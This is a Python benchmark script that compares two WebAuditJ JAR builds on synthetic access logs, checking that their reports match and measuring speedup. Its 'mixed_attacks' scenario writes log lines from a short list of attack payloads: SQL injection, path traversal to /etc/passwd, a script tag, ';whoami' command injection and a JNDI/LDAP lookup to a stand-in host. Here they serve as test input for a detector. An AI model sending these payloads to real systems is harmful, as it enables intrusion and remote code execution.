"""Compare two WebAuditJ JARs, alternating fresh JVMs and checking full report parity."""
import argparse
import datetime as dt
import hashlib
import json
import locale
import os
from pathlib import Path
import statistics
import subprocess

p = argparse.ArgumentParser()
p.add_argument("baseline", type=Path)
p.add_argument("candidate", type=Path)
p.add_argument("--lines", type=int, default=10000)
p.add_argument("--repeats", type=int, default=3)
p.add_argument("--long-ua-lines", type=int, default=1000)
p.add_argument("--scenarios", nargs="+", choices=["normal", "long_ua", "mixed_attacks"], default=["normal", "long_ua", "mixed_attacks"])
p.add_argument("--output", type=Path, default=Path(".workflow/analysis-performance.json"))
a = p.parse_args()
locale.setlocale(locale.LC_TIME, "C")
assert a.lines > 0 and a.repeats > 0 and a.long_ua_lines > 0
root = Path(__file__).resolve().parents[1]
work = root / ".build/analysis-performance"
work.mkdir(parents=True, exist_ok=True)
classes = work / "classes"
classes.mkdir(exist_ok=True)
jars = {"baseline": a.baseline.resolve(), "candidate": a.candidate.resolve()}
subprocess.run(["javac", "-cp", str(jars["baseline"]), "-d", str(classes),
                str(root / "tools/AnalysisBenchmark.java")], check=True)
result = {"synthetic": True, "fresh_jvm": True, "geoip": False,
          "lines": a.lines, "long_ua_lines": a.long_ua_lines, "repeats": a.repeats,
          "jar_sha256": {k: hashlib.sha256(v.read_bytes()).hexdigest() for k, v in jars.items()},
          "scenarios": []}
for scenario in a.scenarios:
    lines = a.long_ua_lines if scenario == "long_ua" else a.lines
    log = work / (scenario + ".log")
    attacks = ["/.env", "/search?q=union+select", "/../../etc/passwd", "/?x=%3Cscript%3E", "/login?x=;whoami", "/?x=${jndi:ldap://evil.test/x}"]
    with log.open("w", encoding="utf-8", newline="\n") as f:
        for i in range(lines):
            stamp = (dt.datetime(2026, 11, 1) + dt.timedelta(seconds=i // 320)).strftime("%d/%b/%Y:%H:%M:%S +0000")
            target = attacks[(i // 5) % len(attacks)] if scenario == "mixed_attacks" and i % 5 == 0 else f"/api/items/{i % 32}?nonce={i}"
            status = 404 if scenario == "mixed_attacks" and i % 5 == 0 else 200
            ua = "Mozilla/5.0" + ("a" * 4096 if scenario == "long_ua" else "")
            f.write(f'192.0.2.{i % 32 + 1} - - [{stamp}] "GET {target} HTTP/1.1" {status} 100 "-" "{ua}"\n')
    runs = {k: [] for k in jars}
    expected = None
    for repeat in range(a.repeats):
        for label in (["baseline", "candidate"] if repeat % 2 == 0 else ["candidate", "baseline"]):
            completed = subprocess.run(["java", "-Xms64m", "-Xmx512m", "-cp", str(classes) + os.pathsep + str(jars[label]),
                                        "io.github.mikoto2000.webaudit.AnalysisBenchmark", str(log)], check=True, capture_output=True, encoding="utf-8")
            row = json.loads(completed.stdout)
            report = row.pop("report")
            # Input path is identical across both JARs; fixed clock removes analysis-time variation.
            encoded = json.dumps(report, sort_keys=True, separators=(",", ":"), ensure_ascii=True).encode()
            row["report_sha256"] = hashlib.sha256(encoded).hexdigest()
            if expected is None:
                expected = row["report_sha256"]
            assert row["report_sha256"] == expected, f"full report mismatch: {scenario}/{label}/{repeat}"
            row["partial"] = report.get("partial", False)
            row["requests"] = report["requests"]
            assert row["requests"] == lines
            runs[label].append(row)
            print(json.dumps(dict(scenario=scenario, implementation=label, repeat=repeat, **row)), flush=True)
    medians = {k: statistics.median(r["analysis_seconds"] for r in v) for k, v in runs.items()}
    result["scenarios"].append(dict(name=scenario, lines=lines, runs=runs, median_seconds=medians,
                                    speedup=medians["baseline"] / medians["candidate"]))
    a.output.parent.mkdir(parents=True, exist_ok=True)
    a.output.write_text(json.dumps(result, indent=2) + "\n", encoding="utf-8")
